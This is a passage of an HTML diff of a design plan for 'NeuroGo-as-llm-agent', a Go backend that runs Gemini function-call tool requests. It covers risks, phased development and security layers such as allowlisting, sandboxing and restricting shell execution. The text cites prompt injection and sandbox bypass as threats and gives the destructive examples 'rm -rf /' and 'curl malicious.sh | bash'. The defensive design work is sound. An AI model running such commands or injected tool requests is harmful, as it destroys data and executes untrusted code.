+<li>Mitigation: Careful design of the state manager's data structures and update logic. For initial phases focusing on single-user, single-session operation, complexity is lower. If concurrency is introduced later, appropriate locking mechanisms or atomic operations would be necessary.</li>
+</ul>
+</li>
+</ul>
+<h3 id="54-performance-considerations">5.4. Performance Considerations<a class="headerlink" href="#54-performance-considerations" title="Permanent link">&para;</a></h3>
+<p>Agentic workflows involving LLM calls and tool execution can impact performance:</p>
+<ul>
+<li>Latency: Each round trip to the LLM API, plus the time for NeuroGo's security checks and tool execution, adds latency to the user experience.29 Complex tasks requiring multiple tool calls can become slow.<ul>
+<li>Mitigation: Optimize the performance of security checks and tool implementations. Choose LLM models that balance capability and speed (e.g., Gemini Flash 21 might be suitable for some tasks). Cautiously explore parallel execution of independent tool calls in later phases (Section 2.3). Cache tool results where appropriate (e.g., reading the same file multiple times).</li>
+</ul>
+</li>
+<li>Cost: LLM API usage typically incurs costs based on the number of input and output tokens processed.14 Long conversations and verbose tool results can increase costs.<ul>
+<li>Mitigation: Optimize prompt engineering to be concise. Manage the context window size effectively (Section 5.3). Use less expensive LLM models for simpler intermediate steps if a multi-LLM approach is adopted later. Implement caching to avoid redundant API calls.</li>
+</ul>
+</li>
+</ul>
+<h3 id="55-riskchallenge-analysis-summary">5.5. Risk/Challenge Analysis Summary<a class="headerlink" href="#55-riskchallenge-analysis-summary" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Risk/Challenge</th>
+<th style="text-align: left;">Description</th>
+<th style="text-align: left;">Potential Impact</th>
+<th style="text-align: left;">Mitigation Strategy (Ref. Section 4 Measures)</th>
+<th style="text-align: left;">Relevant References</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Prompt Injection</td>
+<td style="text-align: left;">Manipulating LLM via prompt to suggest malicious tool calls.</td>
+<td style="text-align: left;">Data breach, unauthorized modification/execution, system disruption.</td>
+<td style="text-align: left;">Allowlisting (4.1), Arg Validation/Sanitization (4.2), Sandboxing (4.3), High-Risk Tool Restriction (4.4), Output Filtering (4.5). Containment focus.</td>
+<td style="text-align: left;">3</td>
+</tr>
+<tr>
+<td style="text-align: left;">Insecure Output Handling</td>
+<td style="text-align: left;">Tool output contains malicious content processed insecurely downstream.</td>
+<td style="text-align: left;">XSS, CSRF, further LLM manipulation.</td>
+<td style="text-align: left;">Output Filtering (4.5), Secure client-side rendering.</td>
+<td style="text-align: left;">3</td>
+</tr>
+<tr>
+<td style="text-align: left;">Insecure Tool Design</td>
+<td style="text-align: left;">Vulnerabilities within NeuroGo TOOL code itself.</td>
+<td style="text-align: left;">Exploitation independent of LLM, potential escalation.</td>
+<td style="text-align: left;">Secure coding practices, Sandboxing (4.3), Least privilege, Code reviews.</td>
+<td style="text-align: left;">3</td>
+</tr>
+<tr>
+<td style="text-align: left;">Excessive Agency</td>
+<td style="text-align: left;">Granting LLM access to too many or too powerful tools.</td>
+<td style="text-align: left;">Increased attack surface, higher impact of misuse/compromise.</td>
+<td style="text-align: left;">Allowlisting (4.1), High-Risk Tool Restriction (4.4), Minimal tool functionality.</td>
+<td style="text-align: left;">3</td>
+</tr>
+<tr>
+<td style="text-align: left;">Data Exfiltration/Leakage</td>
+<td style="text-align: left;">Tricking tools into reading/returning sensitive data or leaking via args.</td>
+<td style="text-align: left;">Loss of confidentiality, privacy violations.</td>
+<td style="text-align: left;">Sandboxing (4.3), Output Filtering (4.5), Careful tool design, Monitoring/Auditing.</td>
+<td style="text-align: left;">3</td>
+</tr>
+<tr>
+<td style="text-align: left;">Sandbox Bypass</td>
+<td style="text-align: left;">Flaws in sandboxing logic allowing access outside workspace.</td>
+<td style="text-align: left;">Unauthorized file access/modification.</td>
+<td style="text-align: left;">Rigorous implementation/testing of sandboxing (4.3), Code reviews.</td>
+<td style="text-align: left;"></td>
+</tr>
+<tr>
+<td style="text-align: left;">Hallucinated Calls/Args</td>
+<td style="text-align: left;">LLM invents tools or provides nonsensical/invalid arguments.</td>
+<td style="text-align: left;">Tool execution errors, unexpected behavior.</td>
+<td style="text-align: left;">Allowlisting (4.1), Arg Validation (4.2), Quality function declarations, Error handling.</td>
+<td style="text-align: left;">14</td>
+</tr>
+<tr>
+<td style="text-align: left;">Incorrect Tool Selection</td>
+<td style="text-align: left;">LLM chooses a valid but inappropriate tool for the task.</td>
+<td style="text-align: left;">Incorrect results, inefficient workflow.</td>
+<td style="text-align: left;">Quality function descriptions, Limit toolset ambiguity, Optional user confirmation.</td>
+<td style="text-align: left;"></td>
+</tr>
+<tr>
+<td style="text-align: left;">API Failures/Rate Limits</td>
+<td style="text-align: left;">External LLM API unavailability or usage limits.</td>
+<td style="text-align: left;">Service disruption, poor user experience.</td>
+<td style="text-align: left;">Error handling, Retries with backoff 14, Caching, User feedback.</td>
+<td style="text-align: left;">14</td>
+</tr>
+<tr>
+<td style="text-align: left;">Context Window Limit</td>
+<td style="text-align: left;">Long conversation history exceeds LLM's processing capacity.</td>
+<td style="text-align: left;">Loss of context, degraded performance, increased cost.</td>
+<td style="text-align: left;">Context summarization/truncation, Sliding window, Use large-context models.7</td>
+<td style="text-align: left;">7</td>
+</tr>
+<tr>
+<td style="text-align: left;">State Synchronization</td>
+<td style="text-align: left;">Ensuring consistent state management, especially with persistence/concurrency.</td>
+<td style="text-align: left;">Data corruption, inconsistent agent behavior.</td>
+<td style="text-align: left;">Careful state manager design, Atomic operations/locking if needed later.</td>
+<td style="text-align: left;"></td>
+</tr>
+<tr>
+<td style="text-align: left;">Latency</td>
+<td style="text-align: left;">Slow response times due to LLM calls, security checks, tool execution.</td>
+<td style="text-align: left;">Poor user experience.</td>
+<td style="text-align: left;">Optimize checks/tools, Faster LLM models 21, Caching, Potential parallelism (later).</td>
+<td style="text-align: left;">29</td>
+</tr>
+<tr>
+<td style="text-align: left;">Cost</td>
+<td style="text-align: left;">LLM API usage incurs monetary costs based on token count.</td>
+<td style="text-align: left;">Increased operational expenses.</td>
+<td style="text-align: left;">Prompt optimization, Context management, Cheaper models where feasible, Caching.</td>
+<td style="text-align: left;">14</td>
+</tr>
+</tbody>
+</table>
+<p>Navigating these challenges requires acknowledging the inherent trade-offs, particularly between security and usability.29 Overly aggressive security might block legitimate use cases, while insufficient security invites disaster. Phased development and continuous testing are essential for finding the right balance. Furthermore, the intrinsic nature of prompt injection vulnerabilities in current LLMs 11 means that mitigation must focus on robust validation and containment within NeuroGo, rather than assuming the LLM's suggestions can ever be fully trusted.</p>
+<h2 id="section-6-phased-development-and-testing-milestones">Section 6: Phased Development and Testing Milestones<a class="headerlink" href="#section-6-phased-development-and-testing-milestones" title="Permanent link">&para;</a></h2>
+<p>A phased approach is recommended for developing NeuroGo-as-llm-agent, allowing for iterative development, testing, and refinement, particularly of the critical security components.14</p>
+<h3 id="61-phase-1-foundational-implementation-focus-core-loop-basic-security">6.1. Phase 1: Foundational Implementation (Focus: Core Loop &amp; Basic Security)<a class="headerlink" href="#61-phase-1-foundational-implementation-focus-core-loop-basic-security" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Goals: Establish the fundamental communication pathway between the LLM (Gemini) and NeuroGo using function calling. Implement the basic agent loop, minimal state management, and foundational security checks for a small set of safe tools.</li>
+<li>Tasks:<ul>
+<li>Implement Gemini API client in llm.go capable of sending requests with function declarations and parsing FunctionCall/FunctionResponse.</li>
+<li>Develop the initial Conversation State Manager (in-memory storage is sufficient).</li>
+<li>Implement the Security Layer stub with basic Tool Allowlisting logic (reading from a simple config file).</li>
+<li>Select 1-2 inherently safe tools (e.g., TOOL.Echo, a read-only TOOL.ReadFile using a preliminary SecureFilePath). Implement basic argument validation (e.g., type checking) for these tools within the Security Layer.</li>
+<li>Implement basic agent mode configuration flags (API key, allowlist file path).</li>
+<li>Develop unit tests for the new state manager, LLM client interaction logic, and basic security checks.</li>
+</ul>
+</li>
+<li>Outcome: A working prototype demonstrating the core LLM -&gt; NeuroGo -&gt; Tool -&gt; LLM loop via function calling for a very limited, safe toolset. Security is minimal but the framework is in place. This phase focuses on getting the mechanics right before tackling complex security for riskier tools.</li>
+</ul>
+<h3 id="62-phase-2-security-hardening-and-tool-expansion-focus-robustness-capability">6.2. Phase 2: Security Hardening and Tool Expansion (Focus: Robustness &amp; Capability)<a class="headerlink" href="#62-phase-2-security-hardening-and-tool-expansion-focus-robustness-capability" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Goals: Implement the comprehensive security design outlined in Section 4. Expand the set of allowlisted tools, ensuring each is securely integrated. Refine configuration and state management.</li>
+<li>Tasks:<ul>
+<li>Implement full argument validation and sanitization logic within the Security Layer, covering various data types (paths, strings, URLs, potentially others) and common injection patterns.</li>
+<li>Mandate, implement, and rigorously test the SecureFilePath sandboxing mechanism. Refactor all relevant filesystem tools to use it exclusively when called by the LLM.</li>
+<li>Implement the high-risk tool restriction policy (e.g., ensuring TOOL.ExecuteCommand 13 is disabled by default for LLM context and requires explicit override).</li>
+<li>Implement input and output filtering mechanisms (Section 4.5).</li>
+<li>Expand the tool allowlist, carefully reviewing and refactoring each newly added tool for security compliance (sandboxing, context awareness).</li>
+<li>Develop comprehensive configuration options (sandbox root, security levels, specific tool toggles).</li>
+<li>Refine the Conversation State Manager (e.g., implement basic context window handling strategies).</li>
+<li>Develop integration tests covering various tool call scenarios, argument types, and security policy enforcement (e.g., testing sandbox boundaries, validation rules).</li>
+</ul>
+</li>
+<li>Outcome: A significantly more secure and capable agent. Core security features are implemented, a wider range of tools is available (but securely constrained), and the system is more configurable and robust.</li>
+</ul>
+<h3 id="63-phase-3-refinement-and-advanced-features-focus-usability-performance-testing">6.3. Phase 3: Refinement and Advanced Features (Focus: Usability, Performance, Testing)<a class="headerlink" href="#63-phase-3-refinement-and-advanced-features-focus-usability-performance-testing" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Goals: Enhance usability through better error handling, optimize performance, handle more complex conversational flows, conduct thorough security testing, and integrate with NeuroScript's bootstrapping objectives.</li>
+<li>Tasks:<ul>
+<li>Implement sophisticated error handling, providing clearer feedback to the LLM (and thus the user) when tool calls fail or security checks are triggered.</li>
+<li>Identify and address performance bottlenecks (latency reduction, cost optimization through caching or model selection).</li>
+<li>Investigate and potentially implement support for more complex interactions, such as multi-turn tool use sequences or handling parallel tool calls if deemed necessary and safe.</li>
+<li>Conduct Dedicated Security Testing:<ul>
+<li>Penetration Testing: Engage internal or external resources to actively probe for vulnerabilities, focusing on bypassing argument validation, escaping the sandbox, and achieving successful prompt injection against tool execution.3</li>
+<li>Red Teaming: Simulate realistic adversarial attacks aiming to achieve specific malicious goals using the agent.3</li>
+<li>Fuzzing: Apply fuzz testing techniques to the argument validation, sanitization, and path resolution logic to uncover edge cases and potential bypasses.3</li>
+</ul>
+</li>
+<li>Integrate the agent's capabilities with specific tasks identified in the NeuroScript self-development roadmap (Section 7).</li>
+<li>Finalize user and developer documentation.</li>
+</ul>
+</li>
+<li>Outcome: A production-ready agent, hardened against security threats through testing, reasonably performant, user-friendly, and demonstrably useful for its intended purpose, including advancing the project's bootstrapping goals.</li>
+</ul>
+<p>This phased approach recognizes that security is an ongoing, iterative process.14 Building defenses in Phase 2 and then actively trying to break them in Phase 3 3 is crucial for achieving confidence in the agent's security posture.</p>
+<h2 id="section-7-alignment-with-neuroscript-bootstrapping-goal">Section 7: Alignment with NeuroScript Bootstrapping Goal<a class="headerlink" href="#section-7-alignment-with-neuroscript-bootstrapping-goal" title="Permanent link">&para;</a></h2>
+<p>The development of NeuroGo-as-llm-agent is not merely an auxiliary feature but appears to be a potentially foundational capability for achieving the NeuroScript project's stated goal of managing its own development lifecycle (as inferred from query context referencing the roadmap 30).</p>
+<h3 id="71-enabling-self-development-tasks">7.1. Enabling Self-Development Tasks<a class="headerlink" href="#71-enabling-self-development-tasks" title="Permanent link">&para;</a></h3>
+<p>The agent architecture directly enables an LLM to orchestrate core software development activities by securely interacting with the local development environment via NeuroGo's tools. For NeuroScript to manage its own development, it needs mechanisms to:</p>
+<ul>
+<li>Read its own source code (LLM requests TOOL.ReadFile).</li>
+<li>Analyze and understand the code (LLM's inherent capability).</li>
+<li>Propose modifications (LLM generates text/code).</li>
+<li>Apply modifications to files (LLM requests TOOL.WriteFile).</li>
+<li>Manage version control (LLM requests TOOL.GitCommit, TOOL.GitPush, etc.).</li>
+<li>Build and test the code (LLM requests TOOL.GoBuild, TOOL.GoTest).</li>
+</ul>
+<p>The NeuroGo-as-llm-agent provides the necessary, secure execution layer for these file system, version control, and build tool interactions.</p>
+<h3 id="72-secure-orchestration-layer">7.2. Secure Orchestration Layer<a class="headerlink" href="#72-secure-orchestration-layer" title="Permanent link">&para;</a></h3>
+<p>Crucially, the agent acts as a secure bridge. While the LLM provides the high-level reasoning and planning for development tasks (e.g., "Refactor this module to improve efficiency" or "Implement the feature described in issue #123"), NeuroGo enforces strict security constraints on how these plans are translated into actions on the local system. This contrasts sharply with the extreme risk of allowing an LLM to directly generate and execute arbitrary shell commands (rm -rf /, curl malicious.sh | bash).17 The agent ensures that the LLM's requests are channeled through pre-defined, allowlisted TOOLs operating under the validation and sandboxing rules of the Security Layer. This enables controlled automation 17 – leveraging the LLM's power without granting it dangerous, unchecked access.</p>
+<h3 id="73-accelerating-the-bootstrapping-roadmap">7.3. Accelerating the Bootstrapping Roadmap<a class="headerlink" href="#73-accelerating-the-bootstrapping-roadmap" title="Permanent link">&para;</a></h3>
+<p>Given the need for secure local interaction, the NeuroGo-as-llm-agent capability is likely a prerequisite or, at minimum, a significant accelerator for the bootstrapping goal.30 Without a secure way for an AI system (orchestrated by an LLM) to interact with its own codebase and development tools, attempts at self-modification would be fraught with unacceptable security risks. This agent provides that secure foundation, allowing the project to leverage state-of-the-art LLMs for complex tasks like code generation, refactoring, and automated testing as part of its own development process. It transforms the abstract goal of "bootstrapping" into a series of concrete, albeit complex, tasks that can be orchestrated via the agent interface. Therefore, building this secure agent capability is likely a critical early step enabling subsequent, more ambitious bootstrapping milestones outlined in the NeuroScript roadmap.</p>
+<h2 id="conclusion">Conclusion<a class="headerlink" href="#conclusion" title="Permanent link">&para;</a></h2>
+<h3 id="summary-of-plan">Summary of Plan<a class="headerlink" href="#summary-of-plan" title="Permanent link">&para;</a></h3>
+<p>This plan outlines a comprehensive approach to evolving NeuroGo into NeuroGo-as-llm-agent, a secure execution backend for LLM-requested tool functions. It proposes an architecture centered around separating LLM reasoning from NeuroGo's controlled execution, leveraging the Gemini API's function calling mechanism. Detailed implementation steps within the Go codebase are specified, alongside a phased development plan. Critically, the plan incorporates a multi-layered security design encompassing tool allowlisting, strict argument validation, mandatory path sandboxing, and restrictions on high-risk tools, designed to mitigate inherent risks like prompt injection and excessive agency.</p>
+<h3 id="emphasis-on-security">Emphasis on Security<a class="headerlink" href="#emphasis-on-security" title="Permanent link">&para;</a></h3>
+<p>The viability and trustworthiness of NeuroGo-as-llm-agent depend entirely on the rigorous implementation, continuous testing, and vigilant maintenance of the security measures detailed herein. The principle of treating all LLM-generated requests as untrusted input must guide every stage of development and deployment. Security cannot be an afterthought; it must be woven into the fabric of the agent's design and implementation from the outset.</p>
+<h3 id="next-steps">Next Steps<a class="headerlink" href="#next-steps" title="Permanent link">&para;</a></h3>
+<p>The recommended next step is to commence Phase 1 of the development plan. This involves establishing the basic communication loop with the Gemini API via function calling, implementing foundational state management, and integrating the initial security layer with allowlisting for a minimal set of safe tools. This will provide a functional prototype upon which the more comprehensive security hardening and feature expansion of subsequent phases can be built.# Notes: NeuroGo as LLM Agent Mechanism</p>
+<h2 id="section-8-gemini-25-discussion-llm-interaction-api-llm-neurogo-request">Section 8: Gemini 2.5 Discussion: LLM Interaction API (LLM -&gt; NeuroGo Request)<a class="headerlink" href="#section-8-gemini-25-discussion-llm-interaction-api-llm-neurogo-request" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Goal: Allow LLM to request NeuroGo execute a TOOL during a conversation.</li>
+<li>Option A: Structured Chat Response:<ul>
+<li>LLM responds with text containing a predefined structure (e.g., JSON) indicating a TOOL call request (tool_name, arguments).</li>
+<li>NeuroGo parses this structured part of the response.</li>
+<li>Pros: Works with standard chat/completion APIs (like the current llm.go setup [cite: uploaded:neuroscript/pkg/core/llm.go]).</li>
+<li>Cons: Requires careful prompt engineering for the LLM to reliably generate the correct structure; parsing logic in NeuroGo can be brittle.</li>
+</ul>
+</li>
+<li>Option B: Function Calling / Tool Use API:<ul>
+<li>Modern LLM APIs (including Gemini) often have explicit support for this.</li>
+<li>NeuroGo declares available TOOLs (name, description, parameters - like ToolSpec [cite: uploaded:neuroscript/pkg/core/tools_types.go]) to the LLM API.</li>
+<li>When the LLM needs a tool, the API response itself is a structured object indicating the tool name and arguments to call.</li>
+<li>NeuroGo receives this object, executes the tool, and sends the result back in the next API call.</li>
+<li>Pros: Most robust, standard, designed for this purpose. Avoids parsing responses.</li>
+<li>Cons: Requires modifying llm.go [cite: uploaded:neuroscript/pkg/core/llm.go] to use the specific function calling mode/parameters of the Gemini API.</li>
+</ul>
+</li>
+<li>Option C: MCP (Multi-Context Prompting):<ul>
+<li>Less common in standard commercial APIs compared to function calling. Might be overly complex or not directly supported by the current Gemini endpoint.</li>
+</ul>
+</li>
+<li>Recommendation: Prioritize Option B (Function Calling). It's the industry standard and most reliable way. If that proves difficult with the specific API endpoint, fall back to Option A (Structured Chat Response).</li>
+</ul>
+<h2 id="2-conversation-state-management">2. Conversation State Management<a class="headerlink" href="#2-conversation-state-management" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Requirement: NeuroGo must maintain the history of the interaction across multiple turns (user prompt -&gt; LLM response -&gt; [LLM tool request -&gt; NeuroGo tool execution -&gt; tool result -&gt; LLM continuation] -&gt; final response).</li>
+<li>Implementation:<ul>
+<li>The logic managing the CALL LLM needs expansion.</li>
+<li>It must store the sequence of messages (user, assistant, tool_request, tool_result).</li>
+<li>For each call to the LLM API (especially after a tool result), the relevant history must be formatted and included according to the API requirements (e.g., the contents array for Gemini multi-turn chat, or the specific format for function calling responses).</li>
+<li>This state management likely belongs within the Go code handling the LLM interaction (llm.go and potentially interpreter_simple_steps.go where CALL LLM is handled).</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-security-limiting-actions">3. Security &amp; Limiting Actions<a class="headerlink" href="#3-security-limiting-actions" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Requirement: Prevent the LLM from making NeuroGo execute arbitrary or harmful commands/actions. This is critical.</li>
+<li>Mechanisms:<ul>
+<li>Tool Allowlist: Explicitly define which TOOLs are available to be called by the LLM. Do not expose all registered tools [cite: uploaded:neuroscript/pkg/core/tools_registry.go] if not necessary. This might involve a separate registration or filtering layer for LLM-callable tools.</li>
+<li>Strict Argument Validation: Enhance ValidateAndConvertArgs [cite: uploaded:neuroscript/pkg/core/tools_validation.go] or add further checks for arguments received from the LLM for tool calls. Pay extra attention to file paths, URLs, shell command arguments, etc. Check types, formats, and potentially value ranges or patterns.</li>
+<li>Path Sandboxing: Consistently use SecureFilePath [cite: uploaded:neuroscript/pkg/core/tools_helpers.go] (or equivalent) for all filesystem operations requested via TOOLs (ReadFile, WriteFile, ListDirectory, GitAdd, etc. [cite: uploaded:neuroscript/pkg/core/tools_fs.go, uploaded:neuroscript/pkg/core/tools_git.go]) to ensure they stay within the allowed working directory.</li>
+<li>Restrict/Disable Dangerous Tools: TOOL.ExecuteCommand [cite: uploaded:neuroscript/pkg/core/tools_shell.go] is high-risk. Consider:<ul>
+<li>Not exposing it to the LLM at all.</li>
+<li>If required, creating a highly restricted version that only allows specific commands from a hardcoded allowlist and performs extreme sanitization on arguments.</li>
+</ul>
+</li>
+<li>Resource Limits: Implement timeouts for LLM API calls and potentially for the execution of tools called by the LLM.</li>
+<li>Deny Direct NS Execution: The LLM should only be allowed to request registered TOOLs, not ask NeuroGo to execute arbitrary NeuroScript code strings it generates dynamically within the agent loop.</li>
+<li>Prompt Guidance (Secondary): Instructing the LLM about disallowed actions is helpful but not sufficient for security. Hardcoded checks and limitations in NeuroGo are essential.</li>
+</ul>
+</li>
+<li>Recommendation: Implement multiple layers: Tool allowlisting, strict validation, path sandboxing, and heavy restrictions (or disabling) of ExecuteCommand. Security needs careful design.</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
